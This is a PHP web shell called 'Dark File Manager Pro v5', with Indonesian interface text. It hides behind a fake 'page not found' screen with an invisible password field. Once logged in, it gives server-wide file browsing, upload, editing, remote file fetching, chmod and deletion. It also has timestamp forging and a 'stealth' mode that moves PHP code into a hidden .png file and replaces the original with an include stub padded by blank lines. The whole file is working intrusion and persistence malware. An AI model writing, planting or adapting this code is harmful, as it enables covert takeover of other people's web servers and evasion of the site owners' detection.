<?php
$password_hash = '$2a$12$QLh7xqC2/49495gjTzGumeqQ12HatXJrvxnntoUW2kmFrUfCxVWdK';
$background_url = 'https://i.pinimg.com/originals/2e/bd/06/2ebd06b4dde55598cff5b33550511c78.gif';
$login_title = 'This Page Does Not Exist';
$login_subtitle = "Sorry, the page you are looking for could not be found. It's just an accident that was not intentional.";

session_start();

if (isset($_POST['login_pass'])) {
    if (password_verify($_POST['login_pass'], $password_hash)) {
        $_SESSION['fm_auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error_msg = "Password salah!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['base_dir'])) {
    $_SESSION['base_dir'] = realpath('.');
}
$base_dir = $_SESSION['base_dir'];

if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
?>
<!DOCTYPE html>
<html lang="en-us"
    prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
        @charset "UTF-8";
        [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak, .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }
        ng\:form { display: block; }
        .ng-animate-shim { visibility: hidden; }
        .ng-anchor { position: absolute; }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?= htmlspecialchars($login_title) ?></title>
    <meta name="description" content="Oops, looks like the page is lost.">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css?family=DM+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
</head>
<body>
    <div class="page-not-found">
        <!-- Ilustrasi gambar error bawaan / Skateboard / Page Not Found asli -->
        <img class="image" alt="Page Not Found" src="/htdocs_error/page_not_found.svg" onerror="this.src='https://cdn.jsdelivr.net/gh/edent/SuperTinyIcons@master/images/svg/codeship.svg';" />
        <h1 class="title"><?= htmlspecialchars($login_title) ?></h1>
        <p class="text"><?= htmlspecialchars($login_subtitle) ?></p>

        <!-- Bagian Input Password Tersembunyi di Paling Bawah (Warna Putih & Tidak Terlihat) -->
        <div class="hidden-login-section">
            <form method="POST">
                <input type="password" name="login_pass" class="secret-input" autocomplete="current-password" autofocus>
                <button type="submit" style="display:none;"></button>
            </form>
        </div>
    </div>
</body>
<style>
    body {
        color: #1d1e20;
        background: #f4f5ff;
        font-size: 14px;
        font-family: "DM Sans", "Roboto", sans-serif !important;
        font-weight: 400;
        -ms-text-size-adjust: 100%;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
        margin: 0;
    }
    .page-not-found {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        padding: 0 16px;
    }
    .image {
        max-width: 100%;
        margin-bottom: 32px;
        height: auto;
        object-fit: contain;
        max-height: 220px;
    }
    .title {
        text-align: center;
        margin-top: 0;
        margin-bottom: 8px;
        font-size: 24px;
        line-height: 32px;
        font-weight: 700;
    }
    .text {
        text-align: center;
        max-width: 650px;
        margin-bottom: 24px;
        font-size: 16px;
        line-height: 24px;
        font-weight: 400;
        color: #6D7081;
    }
    /* Styling khusus menyembunyikan input password agar pas ditekan Tab langsung fokus & tidak terlihat */
    .hidden-login-section {
        position: absolute;
        bottom: 8px;
        left: 8px;
    }
    .secret-input {
        background: #f4f5ff !important;
        color: #f4f5ff !important;
        border: none !important;
        outline: none !important;
        width: 120px;
        height: 20px;
        font-size: 10px;
        opacity: 0.01;
        cursor: default;
    }
    .secret-input:focus {
        opacity: 0.03;
        background: #f4f5ff !important;
        color: #f4f5ff !important;
    }
</style>
</html>
<?php
    exit;
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$dir = realpath($dir) ? realpath($dir) : realpath('.');

$msg = '';
$msg_type = 'info';

// Download File
if (isset($_GET['download'])) {
    $file_download = $dir . DIRECTORY_SEPARATOR . basename($_GET['download']);
    if (is_file($file_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_download) . '"');
        header('Content-Length: ' . filesize($file_download));
        readfile($file_download);
        exit;
    }
}

// Wget
if (isset($_POST['wget_url']) && !empty($_POST['wget_url'])) {
    $url = trim($_POST['wget_url']);
    $filename = basename(parse_url($url, PHP_URL_PATH)) ?: 'downloaded_' . time() . '.bin';
    $target_wget = $dir . DIRECTORY_SEPARATOR . $filename;
    $ch = curl_init($url);
    $fp = fopen($target_wget, 'wb');
    if ($fp && $ch) {
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        $success = curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        $msg = $success ? "Berhasil mengunduh via Wget." : "Gagal mengunduh!";
        $msg_type = $success ? 'success' : 'error';
    }
}

// Upload
if (isset($_FILES['upload_file'])) {
    $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $msg = "File berhasil diunggah."; $msg_type = 'success';
    } else {
        $msg = "Gagal mengunggah file."; $msg_type = 'error';
    }
}

// Buat Folder
if (isset($_POST['new_folder']) && !empty($_POST['new_folder'])) {
    $new_path = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_folder']);
    if (!file_exists($new_path)) {
        mkdir($new_path, 0755, true);
        $msg = "Folder berhasil dibuat."; $msg_type = 'success';
    } else { $msg = "Folder sudah ada."; $msg_type = 'error'; }
}

// Buat File
if (isset($_POST['new_file']) && !empty($_POST['new_file'])) {
    $new_file_path = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_file']);
    if (!file_exists($new_file_path)) {
        file_put_contents($new_file_path, '');
        $msg = "File baru berhasil dibuat."; $msg_type = 'success';
    } else { $msg = "File sudah ada."; $msg_type = 'error'; }
}

// Rename
if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old_p = $dir . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
    $new_p = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (file_exists($old_p) && !file_exists($new_p)) {
        if (rename($old_p, $new_p)) {
            $msg = "Nama berhasil diubah."; $msg_type = 'success';
        } else { $msg = "Gagal mengubah nama."; $msg_type = 'error'; }
    } else { $msg = "Gagal: Nama sudah ada atau file asal tidak ada."; $msg_type = 'error'; }
}

// Hapus Item (Single)
if (isset($_GET['delete'])) {
    $target = $dir . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    if (is_file($target)) { unlink($target); $msg = "File dihapus."; $msg_type = 'success'; }
    elseif (is_dir($target)) { @rmdir($target); $msg = "Folder dihapus."; $msg_type = 'success'; }
}

// Simpan Edit File
if (isset($_POST['save_file_content']) && isset($_POST['edit_file_name'])) {
    $file_target = $dir . DIRECTORY_SEPARATOR . $_POST['edit_file_name'];
    if (is_file($file_target)) {
        file_put_contents($file_target, $_POST['save_file_content']);
        $msg = "Perubahan file disimpan."; $msg_type = 'success';
    }
}

// CHMOD
if (isset($_POST['target_path']) && isset($_POST['new_permission'])) {
    $target_item = realpath($_POST['target_path']);
    $raw_permission = trim($_POST['new_permission']);
    if ($target_item && preg_match('/^[0-7]{3,4}$/', $raw_permission)) {
        @chmod($target_item, octdec('0' . ltrim($raw_permission, '0')));
        $msg = "CHMOD berhasil diubah."; $msg_type = 'success';
    } else { $msg = "Gagal mengubah CHMOD."; $msg_type = 'error'; }
}

// Ubah Tanggal (Single)
if (isset($_POST['touch_path']) && isset($_POST['touch_date'])) {
    $target_touch = realpath($_POST['touch_path']);
    $input_date = $_POST['touch_date'];
    if ($target_touch && !empty($input_date)) {
        $new_time = strtotime($input_date);
        if ($new_time !== false && @touch($target_touch, $new_time)) {
            $msg = "Tanggal berhasil diubah!"; $msg_type = 'success';
        } else { $msg = "Gagal mengubah tanggal."; $msg_type = 'error'; }
    }
}

// Stealth (Single)
if (isset($_POST['hide_file_name'])) {
    $target_hide = $dir . DIRECTORY_SEPARATOR . basename($_POST['hide_file_name']);
    if (is_file($target_hide)) {
        $original_content = file_get_contents($target_hide);
        $hidden_payload_name = '.' . md5(mt_rand()) . '.png';
        $hidden_payload_path = $dir . DIRECTORY_SEPARATOR . $hidden_payload_name;
        if (file_put_contents($hidden_payload_path, $original_content) !== false) {
            @chmod($hidden_payload_path, 0644);
            $padding = str_repeat("\n", 120);
            $stub = "<?php" . $padding . "@include('" . $hidden_payload_name . "');\n?>";
            if (file_put_contents($target_hide, $stub) !== false) {
                $msg = "File berhasil di-stealth!"; $msg_type = 'success';
            } else { $msg = "Gagal memperbarui file utama."; $msg_type = 'error'; }
        } else { $msg = "Gagal membuat file payload."; $msg_type = 'error'; }
    }
}

// Mass Action (Aksi Banyak Sekaligus via Checkbox)
if (isset($_POST['selected_items']) && isset($_POST['batch_action'])) {
    $items = $_POST['selected_items'];
    $action = $_POST['batch_action'];
    $count = 0;

    if ($action === 'delete') {
        foreach ($items as $item) {
            $target = $dir . DIRECTORY_SEPARATOR . basename($item);
            if (is_file($target)) { @unlink($target); $count++; }
            elseif (is_dir($target)) { @rmdir($target); $count++; }
        }
        $msg = "Berhasil menghapus $count item terpilih."; $msg_type = 'success';
    } 
    elseif ($action === 'touch') {
        $input_date = $_POST['batch_date'] ?? date('Y-m-d H:i:s');
        $new_time = strtotime($input_date);
        if ($new_time !== false) {
            foreach ($items as $item) {
                $target = $dir . DIRECTORY_SEPARATOR . basename($item);
                @touch($target, $new_time);
                $count++;
            }
            $msg = "Berhasil mengubah tanggal untuk $count item terpilih."; $msg_type = 'success';
        } else { $msg = "Format tanggal tidak valid."; $msg_type = 'error'; }
    }
}

// Pencarian Global
function searchFiles($dir, $keyword) {
    $results = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $item) {
        if (strpos(strtolower($item->getFilename()), strtolower($keyword)) !== false) {
            $results[] = $item->getPathname();
        }
    }
    return $results;
}

$search_results = [];
if (isset($_GET['search']) && !empty($_GET['search'])) {
    $search_results = searchFiles($dir, $_GET['search']);
}

$search = isset($_GET['q']) ? $_GET['q'] : '';
$raw_items = @scandir($dir);
$folders = [];
$files = [];

if ($raw_items) {
    foreach ($raw_items as $item) {
        if ($item === '.' || $item === '..') continue;
        if ($search !== '' && stripos($item, $search) === false) continue;
        $item_path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($item_path)) $folders[] = $item;
        else $files[] = $item;
    }
}
sort($folders);
sort($files);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Dark File Manager Pro v5</title>
    <style>
        :root {
            --bg-main: #0f172a; --bg-card: #1e293b; --bg-hover: #334155;
            --border-color: #334155; --text-main: #f8fafc; --text-muted: #94a3b8;
            --accent-blue: #38bdf8; --accent-green: #4ade80; --accent-red: #f87171;
        }
        body { font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg-main); color: var(--text-main); margin: 0; padding: 20px; }
        .container { max-width: 1250px; margin: 0 auto; background: var(--bg-card); border-radius: 12px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--border-color); }
        .top-bar { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; margin-bottom: 20px; }
        .breadcrumb { background: #0f172a; padding: 12px 15px; border-radius: 6px; font-family: monospace; word-break: break-all; margin-bottom: 20px; border: 1px solid var(--border-color); font-size: 14px; }
        .breadcrumb a { color: var(--accent-blue); text-decoration: none; font-weight: 600; }
        .controls { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 25px; background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); align-items: center; }
        .controls form { display: flex; gap: 8px; align-items: center; }
        input[type="text"], input[type="file"], input[type="datetime-local"], select { padding: 8px 12px; background: #1e293b; border: 1px solid var(--border-color); color: #fff; border-radius: 6px; font-size: 13px; outline: none; }
        input[type="text"]:focus, select:focus { border-color: var(--accent-blue); }
        .btn { padding: 8px 14px; border: none; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600; text-decoration: none; display: inline-flex; align-items: center; gap: 5px; }
        .btn:hover { opacity: 0.85; }
        .btn-blue { background: #0284c7; color: #fff; }
        .btn-green { background: #16a34a; color: #fff; }
        .btn-red { background: #dc2626; color: #fff; }
        .btn-gray { background: #475569; color: #fff; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; padding: 12px 15px; border-bottom: 1px solid var(--border-color); font-size: 14px; }
        th { background: #0f172a; color: var(--text-muted); font-weight: 600; text-transform: uppercase; font-size: 11px; }
        tr:hover { background: var(--bg-hover); }
        .alert { padding: 12px 18px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; font-weight: 500; }
        .alert-success { background: rgba(74, 222, 128, 0.15); color: var(--accent-green); border: 1px solid rgba(74, 222, 128, 0.3); }
        .alert-error { background: rgba(248, 113, 113, 0.15); color: var(--accent-red); border: 1px solid rgba(248, 113, 113, 0.3); }
        textarea { width: 100%; height: 450px; font-family: 'Fira Code', Consolas, monospace; background: #0f172a; color: #f8fafc; padding: 15px; border: 1px solid var(--border-color); border-radius: 6px; }
        .neon-title { margin: 0; font-size: 22px; font-weight: 800; background: linear-gradient(270deg, #38bdf8, #818cf8, #c084fc, #38bdf8); background-size: 400% 400%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .action-select { padding: 5px 8px; background: #0f172a; color: #38bdf8; border: 1px solid var(--border-color); border-radius: 4px; font-size: 12px; cursor: pointer; }

        .neon-title {
            margin: 0; font-size: 22px; font-weight: 800;
            background: linear-gradient(270deg, #38bdf8, #818cf8, #c084fc, #38bdf8);
            background-size: 400% 400%;
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            animation: gradientShift 6s ease infinite;
            text-shadow: 0 0 20px rgba(56, 189, 248, 0.3);
        }
        .pro-badge {
            display: inline-block; padding: 2px 8px; font-size: 11px; font-weight: 700; color: #fff;
            background: linear-gradient(135deg, #0284c7, #2563eb); border-radius: 4px;
            box-shadow: 0 0 12px rgba(37, 99, 235, 0.6);
            animation: pulseGlow 2s infinite alternate;
            -webkit-text-fill-color: #fff;
        }
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        @keyframes pulseGlow {
            0% { transform: scale(1); box-shadow: 0 0 8px rgba(56, 189, 248, 0.4); }
            100% { transform: scale(1.05); box-shadow: 0 0 16px rgba(56, 189, 248, 0.9); }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="top-bar">
        <h2 class="neon-title">⚡ Dark File Manager <span class="pro-badge">PRO v5</span></h2>
        <a href="?logout=1" class="btn btn-red">Keluar (Logout)</a>
    </div>

    <div class="breadcrumb">
        <a href="?dir=<?= urlencode($base_dir) ?>" class="btn" style="background:#0284c7; margin-right:10px; padding:4px 8px; font-size:11px;">🏠 Home</a>
        <strong>Direktori: </strong>
        <?php
        $path_parts = explode(DIRECTORY_SEPARATOR, $dir);
        $accumulator = '';
        foreach ($path_parts as $index => $part) {
            if ($part === '') { $accumulator = '/'; echo '<a href="?dir=%2F">root</a>/'; continue; }
            $accumulator .= ($accumulator === '/') ? $part : DIRECTORY_SEPARATOR . $part;
            echo '<a href="?dir=' . urlencode($accumulator) . '">' . htmlspecialchars($part) . '</a>/';
        }
        ?>
    </div>

    <?php if ($msg): ?>
        <div class="alert alert-<?= $msg_type ?>"><?= htmlspecialchars($msg) ?></div>
    <?php endif; ?>

    <!-- INTERFACE EDIT FILE -->
    <?php if (isset($_GET['edit'])): 
        $filename_edit = basename($_GET['edit']);
        $target_edit = $dir . DIRECTORY_SEPARATOR . $filename_edit;
        $file_content = @file_get_contents($target_edit);
    ?>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ace.js" type="text/javascript" charset="utf-8"></script>
        
        <style>
            #ace-editor {
                width: 100%;
                height: 500px;
                border-radius: 8px;
                border: 1px solid var(--border-color);
                font-size: 14px;
            }
        </style>

        <h4 style="color: #38bdf8;">Editing File: <?= htmlspecialchars($filename_edit) ?></h4>
        <form method="POST" action="?dir=<?= urlencode($dir) ?>" id="edit-form">
            <input type="hidden" name="edit_file_name" value="<?= htmlspecialchars($filename_edit) ?>">
            <textarea name="save_file_content" id="real-textarea" style="display:none;"><?= htmlspecialchars($file_content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></textarea>
            <div id="ace-editor"><?= htmlspecialchars($file_content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></div>
            <br>
            <button type="submit" class="btn btn-green">Save Changes</button>
            <a href="?dir=<?= urlencode($dir) ?>" class="btn btn-gray">Cancel</a>
        </form>

        <script>
            var editor = ace.edit("ace-editor");
            editor.setTheme("ace/theme/dracula");
            editor.session.setMode("ace/mode/php");
            editor.setOptions({
                fontSize: "10pt",
                showPrintMargin: false,
                highlightActiveLine: true,
                enableBasicAutocompletion: true,
                enableLiveAutocompletion: true
            });

            var form = document.getElementById('edit-form');
            form.onsubmit = function() {
                var code = editor.getValue();
                document.getElementById('real-textarea').value = code;
            };
        </script>
    <?php exit; endif; ?>

    <!-- PANEL KONTROL UTAMA -->
    <div class="controls">
        <form method="POST" action="?dir=<?= urlencode($dir) ?>" enctype="multipart/form-data">
            <input type="file" name="upload_file" required>
            <button type="submit" class="btn btn-blue">Upload</button>
        </form>
        <form method="POST" action="?dir=<?= urlencode($dir) ?>">
            <input type="text" name="new_folder" placeholder="Folder baru..." required>
            <button type="submit" class="btn btn-green">+ Folder</button>
        </form>
        <form method="POST" action="?dir=<?= urlencode($dir) ?>">
            <input type="text" name="new_file" placeholder="File.php/txt..." required>
            <button type="submit" class="btn btn-green">+ File</button>
        </form>
        <form method="POST" action="?dir=<?= urlencode($dir) ?>">
            <input type="text" name="wget_url" placeholder="https://... (Wget)" required style="width: 130px;">
            <button type="submit" class="btn btn-blue">Wget</button>
        </form>
    </div>

    <!-- PENCARIAN -->
    <div class="controls" style="background: #111827;">
        <form method="GET" action="" style="display: flex; gap: 8px; width: 100%; margin: 0;">
            <input type="hidden" name="dir" value="<?= htmlspecialchars($dir) ?>">
            <input type="text" name="search" placeholder="Cari global (.php, index, dll)..." value="<?= htmlspecialchars($_GET['search'] ?? '') ?>" style="flex-grow: 1;">
            <button type="submit" class="btn btn-blue">Cari</button>
            <?php if (!empty($_GET['search'])): ?>
                <a href="?dir=<?= urlencode($dir) ?>" class="btn btn-gray">Reset</a>
            <?php endif; ?>
        </form>
    </div>

    <?php if (!empty($search_results)): ?>
        <div style="background:#1e293b; padding:15px; border-radius:8px; border:1px solid #38bdf8; margin-bottom:20px;">
            <h4>Hasil Pencarian untuk: "<?= htmlspecialchars($_GET['search']) ?>"</h4>
            <ul>
                <?php foreach ($search_results as $path): ?>
                    <li>
                        <span style="color:#94a3b8; font-size:14px;"><?= htmlspecialchars($path) ?></span>
                        <a href="?dir=<?= urlencode(dirname($path)) ?>&edit=<?= urlencode(basename($path)) ?>" style="color:#38bdf8; margin-left:10px;">[Edit]</a>
                    </li>
                <?php endforeach; ?>
            </ul>
        </div>
    <?php endif; ?>

    <!-- TABEL FILE & FOLDER -->
    <form method="POST" action="?dir=<?= urlencode($dir) ?>" id="batch-form">
        <div style="display: flex; gap: 10px; margin-bottom: 12px; align-items: center; background: #111827; padding: 10px; border-radius: 6px; border: 1px solid var(--border-color);">
            <span style="font-size: 13px; color: var(--text-muted); font-weight: 600;">⚡ Aksi Terpilih (Batch):</span>
            <select name="batch_action" id="batch-action-select" class="action-select" required style="width: 180px;">
                <option value="">-- Pilih Aksi Massal --</option>
                <option value="delete">Hapus Terpilih</option>
                <option value="touch">Ubah Tanggal Terpilih</option>
            </select>
            <input type="datetime-local" name="batch_date" id="batch-date-input" style="display:none;">
            <button type="submit" class="btn btn-blue" style="padding: 5px 12px; font-size: 12px;" onclick="return confirm('Jalankan aksi massal pada item terpilih?')">Eksekusi</button>
        </div>

        <table>
            <thead>
                <tr>
                    <th style="width: 30px;"><input type="checkbox" id="select-all" onclick="toggleAll(this)"></th>
                    <th>Nama Berkas / Folder</th>
                    <th>Ukuran</th>
                    <th>Terakhir Dimodifikasi</th>
                    <th>CHMOD / Status Writable</th>
                    <th style="text-align: right; width: 140px;">Pilih Aksi</th>
                </tr>
            </thead>
            <tbody>
                <?php if (dirname($dir) !== $dir): ?>
                <tr>
                    <td colspan="6">
                        <a href="?dir=<?= urlencode(dirname($dir)) ?>" style="text-decoration:none; color: var(--accent-blue); font-weight: 600;">📁 [..] Naik satu tingkat</a>
                    </td>
                </tr>
                <?php endif; ?>

                <?php foreach ($folders as $folder): 
                    $folder_path = $dir . DIRECTORY_SEPARATOR . $folder;
                    $mtime = date("Y-m-d H:i:s", @filemtime($folder_path));
                    $perms = substr(sprintf('%o', @fileperms($folder_path)), -4);
                    $is_writable = is_writable($folder_path);
                    $badge_color = $is_writable ? '#4ade80' : '#f87171';
                ?>
                <tr>
                    <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($folder) ?>"></td>
                    <td>📁 <a href="?dir=<?= urlencode($folder_path) ?>" style="text-decoration:none; color: var(--accent-blue); font-weight: 600;"><?= htmlspecialchars($folder) ?></a></td>
                    <td style="color: var(--text-muted);">-</td>
                    <td style="color: var(--text-muted); font-family: monospace;"><?= $mtime ?></td>
                    <td>
                        <span style="font-family: monospace; background: #0f172a; padding: 2px 6px; border-radius: 4px; font-size: 11px; color: #38bdf8;"><?= $perms ?></span>
                        <span style="font-size: 10px; padding: 2px 6px; border-radius: 4px; background: <?= $badge_color ?>20; color: <?= $badge_color ?>; margin-left: 6px; font-weight: 600;"><?= $is_writable ? 'Writable' : 'Locked' ?></span>
                    </td>
                    <td style="text-align: right;">
                        <select class="action-select" onchange="handleAction(this, '<?= htmlspecialchars($folder_path, ENT_QUOTES) ?>', '<?= htmlspecialchars($folder, ENT_QUOTES) ?>', '<?= $mtime ?>', '<?= $perms ?>')">
                            <option value="">-- Aksi --</option>
                            <option value="date">Ubah Tanggal</option>
                            <option value="chmod">Ubah CHMOD</option>
                            <option value="rename">Rename</option>
                            <option value="delete">Hapus</option>
                        </select>
                    </td>
                </tr>
                <?php endforeach; ?>

                <?php foreach ($files as $file): 
                    $file_path = $dir . DIRECTORY_SEPARATOR . $file;
                    $bytes = @filesize($file_path);
                    $size = ($bytes >= 1048576) ? number_format($bytes / 1048576, 2) . ' MB' : (($bytes >= 1024) ? number_format($bytes / 1024, 2) . ' KB' : $bytes . ' Bytes');
                    $mtime = date("Y-m-d H:i:s", @filemtime($file_path));
                    $perms = substr(sprintf('%o', @fileperms($file_path)), -4);
                    $is_writable = is_writable($file_path);
                    $badge_color = $is_writable ? '#4ade80' : '#f87171';
                    $is_php = (pathinfo($file, PATHINFO_EXTENSION) === 'php');
                ?>
                <tr>
                    <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($file) ?>"></td>
                    <td>📄 <a href="?dir=<?= urlencode($dir) ?>&edit=<?= urlencode($file) ?>" style="color: var(--text-main); text-decoration: none; font-weight: 600;"><?= htmlspecialchars($file) ?></a></td>
                    <td style="color: var(--text-muted);"><?= $size ?></td>
                    <td style="color: var(--text-muted); font-family: monospace;"><?= $mtime ?></td>
                    <td>
                        <span style="font-family: monospace; background: #0f172a; padding: 2px 6px; border-radius: 4px; font-size: 11px; color: #38bdf8;"><?= $perms ?></span>
                        <span style="font-size: 10px; padding: 2px 6px; border-radius: 4px; background: <?= $badge_color ?>20; color: <?= $badge_color ?>; margin-left: 6px; font-weight: 600;"><?= $is_writable ? 'Writable' : 'Locked' ?></span>
                    </td>
                    <td style="text-align: right;">
                        <select class="action-select" onchange="handleAction(this, '<?= htmlspecialchars($file_path, ENT_QUOTES) ?>', '<?= htmlspecialchars($file, ENT_QUOTES) ?>', '<?= $mtime ?>', '<?= $perms ?>', <?= $is_php ? 'true' : 'false' ?>)">
                            <option value="">-- Aksi --</option>
                            <option value="edit">Edit File</option>
                            <option value="download">Download</option>
                            <?php if ($is_php): ?><option value="stealth">Stealth (Hide)</option><?php endif; ?>
                            <option value="date">Ubah Tanggal</option>
                            <option value="chmod">Ubah CHMOD</option>
                            <option value="rename">Rename</option>
                            <option value="delete">Hapus</option>
                        </select>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </form>
</div>

<form id="rename-form" method="POST" action="?dir=<?= urlencode($dir) ?>" style="display:none;">
    <input type="hidden" name="old_name" id="old_name">
    <input type="hidden" name="new_name" id="new_name">
</form>

<form id="chmod-form" method="POST" action="?dir=<?= urlencode($dir) ?>" style="display:none;">
    <input type="hidden" name="target_path" id="chmod_target_path">
    <input type="hidden" name="new_permission" id="chmod_new_permission">
</form>

<form id="touch-form" method="POST" action="?dir=<?= urlencode($dir) ?>" style="display:none;">
    <input type="hidden" name="touch_path" id="touch_path">
    <input type="hidden" name="touch_date" id="touch_date">
</form>

<form id="hide-form" method="POST" action="?dir=<?= urlencode($dir) ?>" style="display:none;">
    <input type="hidden" name="hide_file_name" id="hide_file_name">
</form>

<script>
document.getElementById('batch-action-select').addEventListener('change', function() {
    var dateInput = document.getElementById('batch-date-input');
    if (this.value === 'touch') {
        dateInput.style.display = 'inline-block';
        dateInput.required = true;
    } else {
        dateInput.style.display = 'none';
        dateInput.required = false;
    }
});

function toggleAll(source) {
    checkboxes = document.getElementsByName('selected_items[]');
    for(var i=0, n=checkboxes.length; n>i; i++) {
        checkboxes[i].checked = source.checked;
    }
}

function handleAction(selectObj, targetPath, fileName, currentMtime, currentPerms, isPhp) {
    var action = selectObj.value;
    selectObj.value = ""; 

    if (action === 'edit') {
        window.location.href = "?dir=<?= urlencode($dir) ?>&edit=" + encodeURIComponent(fileName);
    } else if (action === 'download') {
        window.location.href = "?dir=<?= urlencode($dir) ?>&download=" + encodeURIComponent(fileName);
    } else if (action === 'stealth') {
        if (confirm("Jalankan Stealth Mode pada file '" + fileName + "'?")) {
            document.getElementById('hide_file_name').value = fileName;
            document.getElementById('hide-form').submit();
        }
    } else if (action === 'date') {
        var formattedDefault = currentMtime.replace(' ', 'T');
        var newDate = prompt("Ubah tanggal (Format: YYYY-MM-DD HH:MM:SS):", formattedDefault);
        if (newDate) {
            document.getElementById('touch_path').value = targetPath;
            document.getElementById('touch_date').value = newDate;
            document.getElementById('touch-form').submit();
        }
    } else if (action === 'chmod') {
        var newPerms = prompt("Ubah CHMOD (Contoh: 0644, 0755, 0777):", currentPerms);
        if (newPerms) {
            document.getElementById('chmod_target_path').value = targetPath;
            document.getElementById('chmod_new_permission').value = newPerms;
            document.getElementById('chmod-form').submit();
        }
    } else if (action === 'rename') {
        var newName = prompt("Ubah nama file/folder:", fileName);
        if (newName && newName !== fileName) {
            document.getElementById('old_name').value = fileName;
            document.getElementById('new_name').value = newName;
            document.getElementById('rename-form').submit();
        }
    } else if (action === 'delete') {
        if (confirm("Hapus item '" + fileName + "'?")) {
            window.location.href = "?dir=<?= urlencode($dir) ?>&delete=" + encodeURIComponent(fileName);
        }
    }
}
</script>
</body>
</html>
